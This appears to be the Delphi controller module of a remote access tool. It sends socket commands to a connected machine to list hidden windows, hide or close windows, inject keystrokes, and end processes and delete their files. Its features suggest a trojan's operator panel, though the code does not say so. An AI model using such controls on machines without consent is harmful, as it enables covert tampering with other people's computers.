unit UnitWindowManager;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ScktComp, StdCtrls, Spin, umSFPack,zlib,ImageHLP,
  UnitFileTransfer,Menus, ImgList, ToolWin, ComCtrls , Jpeg,
  ClipBrd, UnitSharedData, shellapi,CommCtrl, UnitThumbDb, Buttons;

type
  TWindowManager = class(TForm)
    StatusBar1: TStatusBar;
    ListView1: TListView;
    PopupMenu1: TPopupMenu;
    Refresh1: TMenuItem;
    N1: TMenuItem;
    IncludeVisibleWindows1: TMenuItem;
    IncludeHiddenWindows1: TMenuItem;
    N2: TMenuItem;
    Close1: TMenuItem;
    Disable1: TMenuItem;
    Enable1: TMenuItem;
    Hide1: TMenuItem;
    Show1: TMenuItem;
    Minimize1: TMenuItem;
    Maximize1: TMenuItem;
    Restore1: TMenuItem;
    Flash1: TMenuItem;
    N5: TMenuItem;
    ChangeCaption1: TMenuItem;
    SendKeys1: TMenuItem;
    N6: TMenuItem;
    End2: TMenuItem;
    EndAndDelete1: TMenuItem;
    ImageList1: TImageList;
    GetChildWindows1: TMenuItem;
    Activate1: TMenuItem;
    Nudge1: TMenuItem;
    Timer1: TTimer;
    UpdateSpeed1: TMenuItem;
    High1: TMenuItem;
    Normal1: TMenuItem;
    Low1: TMenuItem;
    Paused1: TMenuItem;
    Timer2: TTimer;
    procedure IncludeVisibleWindows1Click(Sender: TObject);
    procedure IncludeHiddenWindows1Click(Sender: TObject);
    procedure Refresh1Click(Sender: TObject);
    procedure GetChildWindows1Click(Sender: TObject);
    procedure ListView1CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure Close1Click(Sender: TObject);
    procedure Disable1Click(Sender: TObject);
    procedure Enable1Click(Sender: TObject);
    procedure Hide1Click(Sender: TObject);
    procedure Show1Click(Sender: TObject);
    procedure Minimize1Click(Sender: TObject);
    procedure Maximize1Click(Sender: TObject);
    procedure Restore1Click(Sender: TObject);
    procedure Flash1Click(Sender: TObject);
    procedure SendKeys1Click(Sender: TObject);
    procedure ListView1CustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);
    procedure ChangeCaption1Click(Sender: TObject);
    procedure Activate1Click(Sender: TObject);
    procedure End2Click(Sender: TObject);
    procedure EndAndDelete1Click(Sender: TObject);
    procedure Nudge1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Normal1Click(Sender: TObject);
    procedure High1Click(Sender: TObject);
    procedure Low1Click(Sender: TObject);
    procedure Paused1Click(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure ListView1ColumnClick(Sender: TObject; Column: TListColumn);
  private
    { Private declarations }
    FirstRun: bool;
    ActiveWindow: string;
    StringList: TStringList;
    procedure ClickTheColumn;
  public
    { Public declarations }
    MainSocket: TCustomWinSocket;
    NewSocket: TCustomWinSocket;
    SocketData: TSocketData;
    Group,Computer,User: string;
    procedure ParseData(Socket: TCustomWinSocket; Data: string);
    procedure SetUpConnection(Socket: TCustomWinSocket);
  end;

var
  WindowManager: TWindowManager;
  LastSortedColumn: TListColumn;
  Ascending: boolean;
  FileSizeList: TStringList;

implementation

uses UnitSendKeys;

{$R *.dfm}

procedure SendData(Socket: TCustomWinSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'WindowManager|' + Data);
end;

procedure DisconnectProc(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  if TWindowManager(SocketData.Form).NewSocket = nil then exit;
  TWindowManager(SocketData.Form).Timer2.Enabled := True;
  TWindowManager(SocketData.Form).NewSocket := nil;
  TWindowManager(SocketData.Form).Caption := TWindowManager(SocketData.Form).Caption + ' - [Offline]';
end;

procedure TWindowManager.SetUpConnection(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
  Strings: TStringList;
begin
  SocketData := TSocketData(Socket.Data);
  SocketData.DisconnectProc := @DisconnectProc;
  Timer2.Enabled := False;
  Caption := Copy(Caption,1,Length(Caption) -12);
  FirstRun := True;
  Refresh1.Click;
end;

procedure TWindowManager.ParseData(Socket: TCustomWinSocket; Data: string);
var
  Command: string;
  Stream: TMemoryStream;
  Li: TListItem;
  Tmp: string;
  p,i: integer;
  Strings: TStringList;
  OldActiveWindow,NewActiveWindow: string;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if (Command = 'WindowList') or (Command = 'ChildWindowList') then begin

    if Command = 'WindowList' then Timer1.Enabled := True;

    OldActiveWindow := ActiveWindow;
    NewActiveWindow := Split(Data,'|',1);

    ActiveWindow := NewActiveWindow;
    Delete(Data,1,Length(ActiveWindow)+1);

    Strings := TStringList.Create;
    StringList := TStringList.Create;
    Strings.Text := Data;
    Listview1.Items.BeginUpdate;
    for i := 0 to Strings.Count -1 do begin
      Application.ProcessMessages;
      Li := Listview1.FindCaption(0,Split(Strings.Strings[i], '|', 1),False,True,False);
      if Li = nil then begin
        Li := Listview1.Items.Add;
        Li.Caption := Split(Strings.Strings[i], '|', 1);
        Li.SubItems.Add(Split(Strings.Strings[i], '|', 2));
        Li.SubItems.Add(Split(Strings.Strings[i], '|', 3));
        Li.SubItems.Add(Split(Strings.Strings[i], '|', 4));
        Li.SubItems.Add(ExtractFileName(Split(Strings.Strings[i], '|', 5)));
        Li.SubItems.Add(Split(Strings.Strings[i], '|', 6));
        if FirstRun then Li.StateIndex := 0 else Li.StateIndex := 1;
      end else begin
        Application.ProcessMessages;
        Li.StateIndex := 0;
        if Li.SubItems[0] <> Split(Strings.Strings[i], '|', 2) then Li.SubItems[0] := Split(Strings.Strings[i], '|', 2);
        if Li.SubItems[2] <> Split(Strings.Strings[i], '|', 4) then Li.SubItems[2] := Split(Strings.Strings[i], '|', 4);
      end;
      StringList.Add(Li.Caption);
    end;
    Strings.Free;
    for i := Listview1.Items.Count -1 downto 0 do begin
      Application.ProcessMessages;
      if Listview1.Items[i].StateIndex = 2 then begin
        Listview1.Items[i].Delete;
        Continue;
      end;
      p := StringList.IndexOf(Listview1.Items[i].Caption);
      if p = -1 then Listview1.Items[i].StateIndex := 2;
    end;

    StringList.Free;
    FirstRun := False;
    ClickTheColumn;
    Listview1.Items.EndUpdate;
    Listview1.Refresh;
    if Command = 'WindowList' then Timer1.Enabled := True;

  end;





  //    StringList.Free;

  {if Command = 'WindowList' then begin
    Listview1.Clear;
    Strings := TStringList.Create;
    Strings.Text := Data;
    for i := 0 to Strings.Count -1 do begin
      Li := Listview1.Items.Add;
      Li.Caption := Split(Strings.Strings[i], '|', 1);
      Li.SubItems.Add(Split(Strings.Strings[i], '|', 2));
      Li.SubItems.Add(Split(Strings.Strings[i], '|', 3));
      Li.SubItems.Add(Split(Strings.Strings[i], '|', 4));
      Li.SubItems.Add(ExtractFileName(Split(Strings.Strings[i], '|', 5)));
      Li.SubItems.Add(Split(Strings.Strings[i], '|', 6));
    end;
    Strings.Free;
  end;}

end;

procedure TWindowManager.IncludeVisibleWindows1Click(Sender: TObject);
begin
  IncludeVisibleWindows1.Checked := not IncludeVisibleWindows1.Checked;
end;

procedure TWindowManager.IncludeHiddenWindows1Click(Sender: TObject);
begin
  IncludeHiddenWindows1.Checked := not IncludeHiddenWindows1.Checked;
end;

procedure TWindowManager.Refresh1Click(Sender: TObject);
var
  Data: string;
begin
  if IncludeHiddenWindows1.Checked then Data :=  '1'
  else Data :=  '2';

  if IncludeVisibleWindows1.Checked then Data := Data + '1'
  else Data := Data + '2';

  senddata(NewSocket,'WindowList|' + Data);
end;

procedure TWindowManager.GetChildWindows1Click(Sender: TObject);
var
  s: string;
  data: string;
begin
  if not assigned(Listview1.Selected) then exit;

  Timer1.Enabled := False;

  if IncludeHiddenWindows1.Checked then Data :=  '1'
  else Data :=  '2';

  if IncludeVisibleWindows1.Checked then Data := Data + '1'
  else Data := Data + '2';

  FirstRun := True;
  senddata(NewSocket,'ChildWindowList|' + Listview1.Selected.Caption + '|' + Data);
  Listview1.Clear;

end;

procedure TWindowManager.ListView1CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  //Listview1.Canvas.Brush.Color := $F7F7F7;
  if Item.StateIndex = 0 then Listview1.Canvas.Brush.Color := $F7F7F7;
  if Item.StateIndex = 1 then Listview1.Canvas.Brush.Color := clGreen;
  if Item.StateIndex = 2 then Listview1.Canvas.Brush.Color := ClRed;

  if Item.Caption = ActiveWindow then Listview1.Canvas.Font.Color := clGreen
  else Listview1.Canvas.Font.Color := clBlack;

  {if pos('Hidden',Item.SubItems[2]) > 0 then Listview1.Canvas.Font.Color := clRed
  else Listview1.Canvas.Font.Color := clBlack; }
end;

procedure TWindowManager.Close1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then continue;
    SendData(NewSocket,'Close|' + Listview1.Items[i].Caption);
  end;
end;

procedure TWindowManager.Disable1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then continue;
    SendData(NewSocket,'Disable|' + Listview1.Items[i].Caption);
  end;
end;

procedure TWindowManager.Enable1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then continue;
    SendData(NewSocket,'Enable|' + Listview1.Items[i].Caption);
  end;
end;

procedure TWindowManager.Hide1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then continue;
    SendData(NewSocket,'Hide|' + Listview1.Items[i].Caption);
  end;
end;

procedure TWindowManager.Show1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then continue;
    SendData(NewSocket,'Show|' + Listview1.Items[i].Caption);
  end;
end;

procedure TWindowManager.Minimize1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then continue;
    SendData(NewSocket,'Minimize|' + Listview1.Items[i].Caption);
  end;
end;

procedure TWindowManager.Maximize1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then continue;
    SendData(NewSocket,'Maximize|' + Listview1.Items[i].Caption);
  end;
end;

procedure TWindowManager.Restore1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then continue;
    SendData(NewSocket,'Restore|' + Listview1.Items[i].Caption);
  end;
end;

procedure TWindowManager.Flash1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then continue;
    SendData(NewSocket,'Flash|' + Listview1.Items[i].Caption);
  end;
end;

procedure TWindowManager.SendKeys1Click(Sender: TObject);
var
  i: integer;
  a: string;
begin
  SendKeys.WindowManager := Self;
  SendKeys.NewSocket := NewSocket;
  SendKeys.Show;
  {a := InputBox('Send Keys','Enter Keys To Send','');
  if a = '' then exit;
  for i := 0 to Listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then continue;
    SendData(NewSocket,'SendKeys|' + Listview1.Items[i].Caption + '|' + a);
  end;}
end;

procedure TWindowManager.ListView1CustomDrawSubItem(
  Sender: TCustomListView; Item: TListItem; SubItem: Integer;
  State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  if Item.StateIndex = 0 then Listview1.Canvas.Brush.Color := clWhite;
  if Item.StateIndex = 1 then Listview1.Canvas.Brush.Color := clGreen;
  if Item.StateIndex = 2 then Listview1.Canvas.Brush.Color := ClRed;

  if Item.Caption = ActiveWindow then Listview1.Canvas.Font.Color := clGreen
  else Listview1.Canvas.Font.Color := clBlack;

  //Listview1.Canvas.Brush.Color := clWhite;
  {if Item.SubItems.Count < 2 then exit;
  if pos('Hidden',Item.SubItems[2]) > 0 then Listview1.Canvas.Font.Color := clRed
  else Listview1.Canvas.Font.Color := clBlack;
  }
end;

procedure TWindowManager.ChangeCaption1Click(Sender: TObject);
var
  i: integer;
  a: string;
begin
  a := InputBox('Change Caption','Enter New Caption',Listview1.Selected.SubItems[0]);
  for i := 0 to Listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then continue;
    SendData(NewSocket,'ChangeCaption|' + Listview1.Items[i].Caption + '|' + a);
  end;
end;

procedure TWindowManager.Activate1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then continue;
    SendData(NewSocket,'Activate|' + Listview1.Items[i].Caption);
  end;
end;


procedure TWindowManager.End2Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then continue;
    SendData(NewSocket,'EndProcess|' + Listview1.Items[i].Caption);
  end;
end;

procedure TWindowManager.EndAndDelete1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then continue;
    SendData(NewSocket,'EndProcessDelete|' + Listview1.Items[i].Caption);
  end;
end;

procedure TWindowManager.Nudge1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then continue;
    SendData(NewSocket,'Nudge|' + Listview1.Items[i].Caption);
  end;
end;

procedure TWindowManager.Timer1Timer(Sender: TObject);
begin
  Timer1.Enabled := False;
  if NewSocket = nil then exit;
  //showmessage('sending');
  Refresh1.Click;

end;

procedure TWindowManager.Normal1Click(Sender: TObject);
begin
  High1.Checked := False;
  Normal1.Checked := True;
  Low1.Checked := False;
  Paused1.Checked := False;
  Timer1.Interval := 2000;
end;

procedure TWindowManager.High1Click(Sender: TObject);
begin
  High1.Checked := True;
  Normal1.Checked := False;
  Low1.Checked := False;
  Paused1.Checked := False;
  Timer1.Interval := 500;
end;

procedure TWindowManager.Low1Click(Sender: TObject);
begin
  High1.Checked := False;
  Normal1.Checked := False;
  Low1.Checked := True;
  Paused1.Checked := False;
  Timer1.Interval := 4000;
end;

procedure TWindowManager.Paused1Click(Sender: TObject);
begin
  High1.Checked := False;
  Normal1.Checked := False;
  Low1.Checked := False;
  Paused1.Checked := False;
  Timer1.Interval := 1000;
end;

procedure TWindowManager.Timer2Timer(Sender: TObject);
var
  NewSocketData: TSocketData;
  Li: TListItem;
begin
  Li := GetListItem(Group,Computer,User);
  if Li = nil then exit;
  if Li.Data = nil then exit;
  NewSocketData := TSocketData(Li.Data);
  if NewSocketData.MainSocket = nil then exit;
  UnitSharedData.SendData(NewSocketData.MainSocket,'NewConnection|WindowManagerSocket|' + inttostr(Self.Handle));
end;

procedure TWindowManager.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  TmpSocket: TCustomWinSocket;
begin
  Action := caFree;
  try
    TmpSocket := NewSocket;
    NewSocket := nil;
    if TmpSocket <> nil then TmpSocket.Close;
  except
  end;
end;

procedure TWindowManager.FormCreate(Sender: TObject);
begin
  Listview1.DoubleBuffered := True;
  LastSortedColumn := nil;
  Listview1.DoubleBuffered := True;
end;

function SortByColumn(Item1, Item2: TListItem; Data: integer): integer; stdcall;
var
  n1,n2: int64;
  s1,s2: string;
  ex1,ex2: extended;
  num: integer;
  Date1,Date2: TDateTime;
begin
  if (LastSortedColumn.Caption = 'Pid') or
     (LastSortedColumn.Caption = 'Handle') then begin

      if LastSortedColumn.Caption = 'Handle' then begin
        n1 := StrToIntDef(Item1.Caption,0);
        n2 := StrToIntDef(Item2.Caption,0);
      end;

      if LastSortedColumn.Caption = 'Pid' then begin
        n1 := StrToIntDef(Item1.SubItems[4],0);
        n2 := StrToIntDef(Item2.SubItems[4],0);
      end;

      if (n1 = n2) then Result := 0 else if (n1 > n2) then Result := 1 else Result := -1;

  end else begin
    Result := 0;
    if Data = 0 then Result := AnsiCompareText(Item1.Caption, Item2.Caption)
    else Result := AnsiCompareText(Item1.SubItems[Data-1],Item2.SubItems[Data-1]);
  end;

  if not Ascending then Result := -Result;
end;

procedure TWindowManager.ListView1ColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: integer;
begin
  Ascending := not Ascending;
  if Column <> LastSortedColumn then Ascending := not Ascending;
  for i := 0 to Listview1.Columns.Count -1 do Listview1.Column[i].ImageIndex := -1;
  if Ascending then Column.ImageIndex := 13 else Column.ImageIndex := 12;
  LastSortedColumn := Column;
  Listview1.CustomSort(@SortByColumn, LastSortedColumn.Index);
end;

procedure TWindowManager.ClickTheColumn;
begin
  if LastSortedColumn = nil then exit;
  Listview1.CustomSort(@SortByColumn, LastSortedColumn.Index);
end;

end.
